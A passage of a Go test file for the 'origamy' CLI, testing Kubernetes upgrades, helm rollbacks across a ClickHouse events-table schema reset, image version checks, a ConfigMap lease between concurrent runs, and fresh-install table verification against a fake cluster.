	g.history[0].digests = map[string]string{"bulker-worker": fakeDigest}
	g.history = append(g.history, fakeRev{rev: 2, chart: "0.1.20", tags: allTags("0.1.20"), digests: map[string]string{"bulker-worker": fakeDigest}, chImage: chartCH("0.1.20")})
	out = captureStdout(t, func() { err = rollbackKubernetes(0) })
	if err != nil || !g.untouched() {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
}

func TestRollbackAcrossTheResetToDigestPins(t *testing.T) {
	f := newFakeKube(t, "0.1.17", "JSON")
	f.history[0].digests = map[string]string{"bulker-worker": fakeDigest}
	f.history = append(f.history, fakeRev{rev: 2, chart: "0.1.20", tags: allTags("0.1.20"), chImage: chartCH("0.1.20")})
	var err error
	out := captureStdout(t, func() { err = rollbackKubernetes(0) })
	if err == nil || f.at("helm rollback") >= 0 || !strings.Contains(out, "pinned by digest alone") {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
}

// ── ClickHouse images ────────────────────────────────────────────────────────

func TestUpgradeWithAMirroredClickHouseImage(t *testing.T) {
	const mirror = "registry.corp.example/mirror/clickhouse:25.3"
	t.Run("the server says its version", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		out, err := upgradeK8s(t, "0.1.20", "clickhouse.image="+mirror)
		if err != nil || f.live != "JSON" || len(f.dropped) != 1 {
			t.Fatalf("a mirror whose repository is not named clickhouse-server must not be refused up front: err=%v live=%q:\n%s", err, f.live, out)
		}
	})
	t.Run("an old server is told during the reset, before the table is touched", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		f.serverVersion = "24.8.4.13"
		out, err := upgradeK8s(t, "0.1.20", "clickhouse.image="+mirror)
		if err == nil || !strings.Contains(out, "needs ClickHouse 25.3 or newer") || !strings.Contains(out, "the events table was not touched") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
		if f.live != "String" || f.asideCall() >= 0 || f.marker == nil {
			t.Fatalf("live=%q record=%v: want the table untouched and the reset still recorded", f.live, f.marker)
		}
	})
	t.Run("latest", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		if out, err := upgradeK8s(t, "0.1.20", "clickhouse.image=clickhouse/clickhouse-server:latest"); err != nil || f.live != "JSON" {
			t.Fatalf("err=%v:\n%s", err, out)
		}
	})
}

func TestUpgradeThatSetsClickHouseBelowTheNewTable(t *testing.T) {
	// Nothing to reset, yet the images write the new table and this run would
	// put ClickHouse 24.8 under them: refused from the values, before helm.
	f := newFakeKube(t, "0.1.20", "JSON")
	out, err := upgradeK8s(t, "0.1.20", "clickhouse.image=clickhouse/clickhouse-server:24.8")
	if err == nil || !strings.Contains(out, "ClickHouse 24.8") || !strings.Contains(out, "needs ClickHouse 25.3 or newer") || !strings.Contains(out, "Nothing has been changed.") {
		t.Fatalf("got err=%v:\n%s", err, out)
	}
	if f.at(helmUpgrade) >= 0 || !f.untouched() {
		t.Fatalf("something changed:\n%s", strings.Join(f.calls, "\n"))
	}
	// On the old side of the reset an old ClickHouse is right.
	g := newFakeKube(t, "0.1.16", "String")
	if out, err := upgradeK8s(t, "0.1.17", "clickhouse.image=clickhouse/clickhouse-server:24.8"); err != nil || !g.untouched() {
		t.Fatalf("err=%v:\n%s", err, out)
	}
}

// ── The lease ────────────────────────────────────────────────────────────────

func TestLeaseWhileAnotherRunHoldsIt(t *testing.T) {
	hold := func(f *fakeKube, age time.Duration) {
		f.lease = map[string]string{"holder": "laptop:4242:ab12cd34", "command": "upgrade", "acquired": time.Now().Add(-age).UTC().Format(time.RFC3339)}
		f.leaseRV = 5
	}
	t.Run("an upgrade", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		hold(f, time.Minute)
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || !strings.Contains(out, "Another origamy run is working on this data plane's events table") || !strings.Contains(out, "laptop:4242:ab12cd34") || !strings.Contains(out, "kubectl delete configmap "+kubeLeaseConfigMap) {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
		if f.at(helmUpgrade) >= 0 || f.marker != nil || f.count("kubectl exec") != 0 || f.lease["holder"] != "laptop:4242:ab12cd34" {
			t.Fatalf("a refused run changed something, or took the other's lease:\n%s", strings.Join(f.calls, "\n"))
		}
	})
	t.Run("a rollback across the reset", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		f.history = append(f.history, fakeRev{rev: 2, chart: "0.1.20", tags: allTags("0.1.20"), chImage: chartCH("0.1.20")})
		hold(f, time.Minute)
		var err error
		out := captureStdout(t, func() { err = rollbackKubernetes(0) })
		if err == nil || !strings.Contains(out, "Another origamy run") || f.at("helm rollback") >= 0 {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
	t.Run("a deploy that crosses the reset", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "JSON")
		hold(f, time.Minute)
		var headline, hint string
		var giveUp func()
		captureStdout(t, func() { headline, hint, giveUp = kubeDeployProblem("0.1.20") })
		if giveUp != nil || !strings.Contains(headline, "Another origamy run") || !strings.Contains(hint, "Nothing has been enrolled or installed.") {
			t.Fatalf("got %q %q", headline, hint)
		}
	})
	t.Run("a move that cannot touch the table takes no lease and ignores another's", func(t *testing.T) {
		f := newFakeKube(t, "0.1.19", "JSON")
		hold(f, time.Minute)
		if out, err := upgradeK8s(t, "0.1.20"); err != nil || f.count("kubectl create") != 0 || f.lease["holder"] != "laptop:4242:ab12cd34" {
			t.Fatalf("err=%v:\n%s", err, out)
		}
	})
	t.Run("a lease left by a run that died is taken over", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		hold(f, kubeLeaseStale+time.Minute)
		out, err := upgradeK8s(t, "0.1.20")
		if err != nil || f.live != "JSON" || f.lease != nil || f.count("kubectl replace") != 1 {
			t.Fatalf("got err=%v lease=%v:\n%s", err, f.lease, out)
		}
	})
	t.Run("a takeover that another run won", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		hold(f, kubeLeaseStale+time.Minute)
		prev := kubeRunStdin
		t.Cleanup(func() { kubeRunStdin = prev })
		kubeRunStdin = func(d time.Duration, input, name string, args ...string) (string, error) {
			if slices.Contains(args, "replace") {
				// Somebody else replaced it in between.
				f.leaseRV++
			}
			return prev(d, input, name, args...)
		}
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || f.at(helmUpgrade) >= 0 {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
	t.Run("a user who may not create ConfigMaps", func(t *testing.T) {
		f := newFakeKube(t, "0.1.17", "String")
		f.leaseCreateForbidden = true
		out, err := upgradeK8s(t, "0.1.20")
		if err == nil || !strings.Contains(out, "create on configmaps") || f.at(helmUpgrade) >= 0 {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
}

func TestLeaseIsGivenUpOnEveryWayOut(t *testing.T) {
	for _, tc := range []struct {
		name  string
		setup func(*fakeKube)
	}{
		{"success", func(f *fakeKube) {}},
		{"a failed reset", func(f *fakeKube) { f.schemaFails = 1; f.initJobOff = true }},
		{"a failed check", func(f *fakeKube) { f.podLag = -1 }},
		{"a failed helm", func(f *fakeKube) { f.helmFails = true }},
		{"a refusal after the lease", func(f *fakeKube) { f.probeFails = true }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFakeKube(t, "0.1.17", "String")
			tc.setup(f)
			_, _ = upgradeK8s(t, "0.1.20") // each way out but one fails; only the lease is checked
			if f.lease != nil || f.count("kubectl create") != 1 {
				t.Fatalf("lease %v after %d creates", f.lease, f.count("kubectl create"))
			}
		})
	}
}

// ── A fresh install ──────────────────────────────────────────────────────────

func freshDeploy(t *testing.T, f *fakeKube, ext ...*externalClickHouse) (string, error) {
	t.Helper()
	p := &k8sPlan{chartVer: "0.1.20", preset: presets[0], exposeMode: 2, ingressHost: "events.example.com", ingressClass: "nginx"}
	if len(ext) > 0 {
		p.clickhouse = ext[0]
	}
	var err error
	out := captureStdout(t, func() {
		err = applyKubernetes(&token.Enrollment{ID: "dp_test", Tok: "tok", Addr: "cp.example.com:443", URL: "https://cp.example.com"}, nil, p)
	})
	return out, err
}

func TestFreshInstallChecksWithoutHoldingTheInstallUp(t *testing.T) {
	t.Run("the table is there", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "")
		out, err := freshDeploy(t, f)
		if err != nil || f.live != "JSON" || !strings.Contains(out, "Send events") || !strings.Contains(out, "ClickHouse holds the new events table") {
			t.Fatalf("got err=%v live=%q:\n%s", err, f.live, out)
		}
	})
	t.Run("the table is missing: endpoint printed, failure marked, rerun recorded", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "")
		f.initJobOff = true
		out, err := freshDeploy(t, f)
		if err == nil {
			t.Fatalf("want the install to fail:\n%s", out)
		}
		box, fail := strings.Index(out, "Send events"), strings.Index(out, "The data plane is installed, but ClickHouse holds no events table")
		if box < 0 || fail < 0 || box > fail {
			t.Fatalf("want the endpoint and summary before the failure (%d, %d):\n%s", box, fail, out)
		}
		if !strings.Contains(out, "events.example.com/v1/identify") || !strings.Contains(out, "The events table check FAILED") || strings.Contains(out, "Your dashboard will show it as Connected") {
			t.Fatalf("summary does not mark the failure:\n%s", out)
		}
		// The rerun the message names creates the table: it is a recorded create.
		if f.marker["action"] != markerCreate || f.marker["version"] != "0.1.20" || !strings.Contains(out, "`origamy upgrade --version 0.1.20` finishes the work on the events table left recorded") {
			t.Fatalf("record %v:\n%s", f.marker, out)
		}
		if strings.Contains(out, "history from before the reset") || strings.Contains(out, "Then `") && strings.Contains(out, "Once it answers: Then") {
			t.Fatalf("wording of an upgrade, for an install:\n%s", out)
		}
		out, err = upgradeK8s(t, "0.1.20")
		if err != nil || f.live != "JSON" || f.marker != nil || f.asideCall() >= 0 || len(f.dropped) != 0 {
			t.Fatalf("rerun: err=%v live=%q record=%v:\n%s", err, f.live, f.marker, out)
		}
	})
	t.Run("the table is missing on an external ClickHouse: by hand, nothing recorded", func(t *testing.T) {
		// The CLI never creates the table on an external server, so a record
		// would name a rerun that refuses, and hold rollbacks and deploys up.
		f := newFakeKube(t, "0.1.20", "").useExternal("")
		f.initJobOff = true
		out, err := freshDeploy(t, f, &externalClickHouse{host: "ch.example.com", port: 9440, secure: true, user: "origamy"})
		if err == nil || !strings.Contains(out, "Send events") || !strings.Contains(out, "apply the chart's schema") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
		// No rerun looks at an external table again: the failure must not promise one.
		if f.marker != nil || strings.Contains(out, "Then The") || strings.Contains(out, "left recorded") || strings.Contains(out, "checks again") || !strings.Contains(out, "does not look at an external ClickHouse's table again") {
			t.Fatalf("record %v:\n%s", f.marker, out)
		}
	})
	t.Run("ClickHouse cannot be asked: not a failure", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "")
		f.execForbidden = true
		out, err := freshDeploy(t, f)
		if err != nil || !strings.Contains(out, "Send events") || !strings.Contains(out, "The events table was not verified") || !strings.Contains(out, "kubectl exec -n origamy-dp odp-clickhouse-0") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
		if f.count("kubectl exec") != 1 || f.marker != nil || f.lease != nil {
			t.Fatalf("a permission that is missing was retried, or something recorded:\n%s", strings.Join(f.calls, "\n"))
		}
	})
	t.Run("the release's objects cannot be listed: not a failure", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "")
		f.listForbidden = true
		out, err := freshDeploy(t, f)
		if err != nil || !strings.Contains(out, "The events table was not verified") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
	t.Run("the schema Job is still at work: not a failure", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "")
		f.initJobOff = true
		f.initJobPolls = 1000
		out, err := freshDeploy(t, f)
		if err != nil || !strings.Contains(out, "the chart's schema Job is still at work") || f.marker != nil {
			t.Fatalf("got err=%v record=%v:\n%s", err, f.marker, out)
		}
	})
	t.Run("ClickHouse is not up yet: not a failure", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "")
		f.chNotReady = true
		out, err := freshDeploy(t, f)
		if err != nil || !strings.Contains(out, "The events table was not verified") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
	t.Run("the images cannot write the table", func(t *testing.T) {
		f := newFakeKube(t, "0.1.20", "String")
		out, err := freshDeploy(t, f)
		if err == nil || !strings.Contains(out, "Send events") || !strings.Contains(out, "ClickHouse holds the pre-reset events table") {
			t.Fatalf("got err=%v:\n%s", err, out)
		}
	})
}
